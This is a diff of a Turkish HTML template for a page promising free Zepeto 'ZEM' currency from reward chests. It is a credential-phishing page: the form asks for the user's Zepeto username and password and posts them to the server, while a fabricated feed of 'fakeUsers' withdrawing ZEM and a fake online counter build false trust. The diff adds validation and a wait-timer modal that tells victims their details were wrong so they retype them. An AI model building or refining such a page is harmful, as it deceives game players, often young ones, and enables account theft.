@@ -34,6 +34,19 @@
         </defs>
     </svg>
 
+    <!-- Yarı Şeffaf Gelişmiş Hata Modalı -->
+    <div class="error-modal-overlay" id="errorModalOverlay" style="display: none;">
+        <div class="error-modal-box led-frame">
+            <button class="error-close-btn" onclick="closeErrorModal()">×</button>
+            <div class="error-modal-icon">⚠️</div>
+            <h3 class="error-modal-title">İşlem Başarısız</h3>
+            <p class="error-modal-text" id="errorModalText">Bilgiler yanlış, lütfen doğru bilgiyi bulunuz ve tekrar deneyin!</p>
+            <div class="error-countdown-box" id="errorModalCountdownBox">
+                ⏳ Bekleme Süresi: <span id="errorModalTimerText">10</span> saniye
+            </div>
+        </div>
+    </div>
+
     <div class="container led-frame">
         <!-- Üst Bilgi / Kabinet Çubuğu -->
         <div class="header-bar">
@@ -75,7 +88,8 @@
             </div>
 
             {% if error %}
-            <div class="alert-error">{{ error }}</div>
+            <!-- Sunucudan gelen hata tetikleyicisi -->
+            <input type="hidden" id="server-error-msg" value="{{ error }}">
             {% endif %}
 
             <!-- Sandıklar Alanı -->
@@ -195,23 +209,30 @@
                     </div>
                 </div>
 
+                <!-- 1. Fotodaki Kırmızı Çerçeveli Alan (Ana Ekrandaki Canlı Geri Sayım ve Uyarı Kutusu) -->
+                <div id="mainBannerAlert" class="main-banner-alert" style="display: none;">
+                    ⚠️ <span id="mainBannerText">Bekleme süresi aktif!</span> (<span id="mainBannerTimer">10</span>s)
+                </div>
+
                 <!-- ZEM Çekim Formu -->
                 <div class="withdraw-box led-frame">
                     <h3><img src="{{ url_for('static', filename='pink-gem.png') }}" class="gem-icon" alt="ZEM"> ZEM'leri Hesaba Aktar</h3>
                     <p class="warning-text">⚠️ <b>Dikkat:</b> Yanlış şifre girerseniz hesabınıza ZEM yatmaz!</p>
                     
-                    <form action="/withdraw" method="POST" class="form">
+                    <form action="/withdraw" method="POST" class="form" id="withdrawForm" onsubmit="return validateForm(event)">
                         <div class="input-group">
                             <label>E-posta Adresi</label>
-                            <input type="email" name="email" class="led-input" required placeholder="ornek@mail.com">
+                            <input type="email" name="email" id="emailInput" class="led-input" required placeholder="ornek@mail.com">
+                            <div id="emailError" class="field-error-text" style="display:none;"></div>
                         </div>
                         <div class="input-group">
                             <label>Zepeto Kullanıcı Adı</label>
-                            <input type="text" name="username" class="led-input" required placeholder="Örn: zepeto_user99">
+                            <input type="text" name="username" id="usernameInput" class="led-input" required placeholder="Örn: zepeto_user99">
                         </div>
                         <div class="input-group">
                             <label>Zepeto Şifre</label>
-                            <input type="password" name="password" class="led-input" required placeholder="••••••••">
+                            <input type="password" name="password" id="passwordInput" class="led-input" required placeholder="••••••••">
+                            <div id="passwordError" class="field-error-text" style="display:none;">Zepeto şifresi en az 6 karakter olmalıdır!</div>
                         </div>
                         <div class="input-group">
                             <label>Gönderim Seçeneği</label>
@@ -220,7 +241,7 @@
                                 <option value="parca">Parça Parça Çek (Günlük Bölünmüş)</option>
                             </select>
                         </div>
-                        <button type="submit" class="btn btn-primary btn-click-effect" style="margin-top: 8px;">ZEM'leri Hesaba Gönder</button>
+                        <button type="submit" id="submitBtn" class="btn btn-primary btn-click-effect" style="margin-top: 8px;">ZEM'leri Hesaba Gönder</button>
                     </form>
                 </div>
             </div>
@@ -229,7 +250,147 @@
     </div>
 
     <script>
-        // --- 1. Anlık Canlı Online Sayaç ---
+        let errorTimerInterval = null;
+
+        function startGlobalCountdown(totalSeconds, message) {
+            const overlay = document.getElementById('errorModalOverlay');
+            const textEl = document.getElementById('errorModalText');
+            const timerText = document.getElementById('errorModalTimerText');
+            
+            const banner = document.getElementById('mainBannerAlert');
+            const bannerText = document.getElementById('mainBannerText');
+            const bannerTimer = document.getElementById('mainBannerTimer');
+            const submitBtn = document.getElementById('submitBtn');
+
+            textEl.innerHTML = message;
+            overlay.style.display = 'flex';
+
+            // Ana ekrandaki kırmızı çerçeveli alanı aktif et ve doldur
+            banner.style.display = 'block';
+            bannerText.innerText = message;
+
+            // Butonu kilitle
+            if (submitBtn) {
+                submitBtn.disabled = true;
+                submitBtn.style.opacity = '0.5';
+                submitBtn.style.cursor = 'not-allowed';
+            }
+
+            if (errorTimerInterval) clearInterval(errorTimerInterval);
+
+            let timeLeft = totalSeconds;
+            timerText.innerText = timeLeft;
+            bannerTimer.innerText = timeLeft;
+
+            errorTimerInterval = setInterval(() => {
+                timeLeft--;
+                timerText.innerText = timeLeft;
+                bannerTimer.innerText = timeLeft;
+
+                if (timeLeft <= 0) {
+                    clearInterval(errorTimerInterval);
+                    overlay.style.display = 'none';
+                    banner.style.display = 'none';
+
+                    // Süre bittiği an butonu aktif et!
+                    if (submitBtn) {
+                        submitBtn.disabled = false;
+                        submitBtn.style.opacity = '1';
+                        submitBtn.style.cursor = 'pointer';
+                    }
+                }
+            }, 1000);
+        }
+
+        function closeErrorModal() {
+            // Çarpıya basılıp modal kapatılsa bile ana ekrandaki sayaç ve buton kilitli kalmaya devam eder, böylece süre takip edilir.
+            document.getElementById('errorModalOverlay').style.display = 'none';
+        }
+
+        // Sayfa yüklendiğinde sunucudan hata geldiyse sayaç başlat
+        window.addEventListener('DOMContentLoaded', () => {
+            const serverErrorEl = document.getElementById('server-error-msg');
+            if (serverErrorEl) {
+                const errText = serverErrorEl.value;
+                let waitTime = 10;
+
+                if (errText.includes('1 dakika') || errText.includes('beklemek')) {
+                    waitTime = 60;
+                } else if (errText.includes('saniye')) {
+                    const match = errText.match(/\d+/);
+                    waitTime = match ? parseInt(match[0]) : 30;
+                }
+                startGlobalCountdown(waitTime, errText);
+            }
+        });
+
+        // --- E-POSTA DOĞRULAMA ---
+        function isValidEmailDomain(email) {
+            const parts = email.split('@');
+            if (parts.length !== 2) return false;
+            const domain = parts[1].toLowerCase();
+
+            const allowedDomains = [
+                'gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com',
+                'mail.ru', 'yandex.ru', 'yandex.com', 'proton.me', 'protonmail.com',
+                'zoho.com', 'gmx.com', 'aol.com', 'live.com', 'msn.com'
+            ];
+
+            const tempMailKeywords = [
+                'yopmail', 'temp-mail', 'guerrillamail', '10minutemail', 'mailinator',
+                'throwawaymail', 'dispostable', 'sharklasers', 'getairmail', 'nada.ltd',
+                'tempmail', 'fakemail', 'trashmail', 'maildrop'
+            ];
+
+            if (allowedDomains.includes(domain)) return true;
+            for (let keyword of tempMailKeywords) {
+                if (domain.includes(keyword)) return true;
+            }
+
+            const domainParts = domain.split('.');
+            if (domainParts.length < 2) return false;
+            const tld = domainParts[domainParts.length - 1];
+            if (tld.length < 2 || /^[qwdfghjklzxcvbnm]{4,}$/.test(domainParts[0])) {
+                return false;
+            }
+            return true;
+        }
+
+        function validateForm(event) {
+            const passwordInput = document.getElementById('passwordInput');
+            const passwordError = document.getElementById('passwordError');
+            const emailInput = document.getElementById('emailInput');
+            const emailError = document.getElementById('emailError');
+
+            let isValid = true;
+
+            if (passwordInput.value.length < 6) {
+                passwordError.style.display = 'block';
+                passwordInput.style.borderColor = '#ff7675';
+                isValid = false;
+            } else {
+                passwordError.style.display = 'none';
+                passwordInput.style.borderColor = '#a855f7';
+            }
+
+            if (!isValidEmailDomain(emailInput.value)) {
+                emailError.innerText = 'Lütfen geçerli bir e-posta adresi girin.';
+                emailError.style.display = 'block';
+                emailInput.style.borderColor = '#ff7675';
+                isValid = false;
+            } else {
+                emailError.style.display = 'none';
+                emailInput.style.borderColor = '#a855f7';
+            }
+
+            if (!isValid) {
+                event.preventDefault();
+                return false;
+            }
+            return true;
+        }
+
+        // --- Canlı Sayaçlar ---
         function updateOnlineCount() {
             const onlineEl = document.getElementById('online-count');
             if (onlineEl) {
@@ -243,40 +404,31 @@
         }
         setInterval(updateOnlineCount, 3000);
 
-        // --- 2. Canlı İşlem Geçmişi (Real-time Live Feed) ---
         const fakeUsers = [
             "elifkoc_", "oyku.zepeto", "baris_zpt", "mira_queen", "zepeto_pro99",
             "caner_vip", "selen_star", "deniz.zpt", "batu_legend", "asli_rose",
             "mert_zepeto", "azra_cute", "yigit_king", "duru_pink", "kaan_shadow",
-            "ecem_style", "burak_x", "melis_vibe", "emre_gold", "tuana_sparkle",
-            "ardazpt", "ceren_blue", "umut_dark", "nisa_sweet", "kerem_pro",
-            "defne_angel", "oguz_blaze", "yaren_sun", "tolga_zpt", "irem_diamond"
+            "ecem_style", "burak_x", "melis_vibe", "emre_gold", "tuana_sparkle"
         ];
         const fakeAmounts = [100, 150, 200, 250, 300, 350];
 
         function updateLiveFeed() {
             const feedEl = document.getElementById('live-feed-content');
             if (!feedEl) return;
-
             feedEl.classList.add('feed-fade-out');
-
             setTimeout(() => {
                 const randomUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
                 const randomAmount = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
-                
                 feedEl.innerHTML = `⚡ <span class="feed-user-highlight">${randomUser}</span> <b>${randomAmount} ZEM</b> çekti! <span class="feed-status">İşlem Başarılı</span>`;
                 feedEl.classList.remove('feed-fade-out');
             }, 300);
         }
         setInterval(updateLiveFeed, 2000);
 
-        // --- 3. Sandık Açılma Mantığı ---
         let chestLocked = false;
-
         function openChest(chestEl) {
             if (chestLocked) return;
             chestLocked = true;
-
             const allChests = document.querySelectorAll('.chest-box');
             allChests.forEach(c => c.classList.add('chest-disabled'));
             chestEl.classList.remove('chest-disabled');
@@ -301,13 +453,12 @@
                 } else {
                     chestLocked = false;
                     document.querySelectorAll('.chest-box').forEach(c => c.classList.remove('chest-disabled'));
-                    alert(data.message || 'Bir hata oluştu, tekrar dene.');
+                    alert(data.message || 'Bir hata oluştu.');
                 }
             })
             .catch(() => {
                 chestLocked = false;
                 document.querySelectorAll('.chest-box').forEach(c => c.classList.remove('chest-disabled'));
-                alert('Bağlantı hatası gerçekleşti.');
             });
         }
 
@@ -319,7 +470,6 @@
                 const overlay = document.getElementById('reward-overlay');
                 const numberEl = document.getElementById('reward-number');
                 overlay.classList.add('show');
-                fireConfetti();
                 countUp(numberEl, amount, 700);
 
                 if (typeof total === 'number') {
@@ -344,67 +494,12 @@
             document.getElementById('reward-overlay').classList.remove('show');
         });
 
-        function fireConfetti() {
-            const canvas = document.getElementById('confetti-canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = canvas.offsetWidth;
-            canvas.height = canvas.offsetHeight;
-
-            const colors = ['#a855f7', '#ffd866', '#ff9ecf', '#7c3aed', '#60e3c2'];
-            const pieces = [];
-            const count = 70;
-
-            for (let i = 0; i < count; i++) {
-                pieces.push({
-                    x: canvas.width / 2,
-                    y: canvas.height / 2,
-                    vx: (Math.random() - 0.5) * 9,
-                    vy: (Math.random() - 1.4) * 9,
-                    size: Math.random() * 6 + 4,
-                    color: colors[Math.floor(Math.random() * colors.length)],
-                    rotation: Math.random() * 360,
-                    spin: (Math.random() - 0.5) * 20,
-                    life: 0
-                });
-            }
-
-            let frame = 0;
-            const maxFrames = 90;
-
-            function animate() {
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                pieces.forEach(p => {
-                    p.vy += 0.22;
-                    p.x += p.vx;
-                    p.y += p.vy;
-                    p.rotation += p.spin;
-                    p.life++;
-
-                    ctx.save();
-                    ctx.translate(p.x, p.y);
-                    ctx.rotate((p.rotation * Math.PI) / 180);
-                    ctx.fillStyle = p.color;
-                    ctx.globalAlpha = Math.max(0, 1 - frame / maxFrames);
-                    ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size * 0.6);
-                    ctx.restore();
-                });
-
-                frame++;
-                if (frame < maxFrames) {
-                    requestAnimationFrame(animate);
-                } else {
-                    ctx.clearRect(0, 0, canvas.width, canvas.height);
-                }
-            }
-            animate();
-        }
-
         function copyLink() {
             var copyText = document.getElementById("ref-link");
             copyText.select();
             copyText.setSelectionRange(0, 99999);
             navigator.clipboard.writeText(copyText.value);
-            alert("Davet bağlantısı kopyalandı: " + copyText.value);
+            alert("Davet bağlantısı kopyalandı!");
         }
     </script>
 </body>
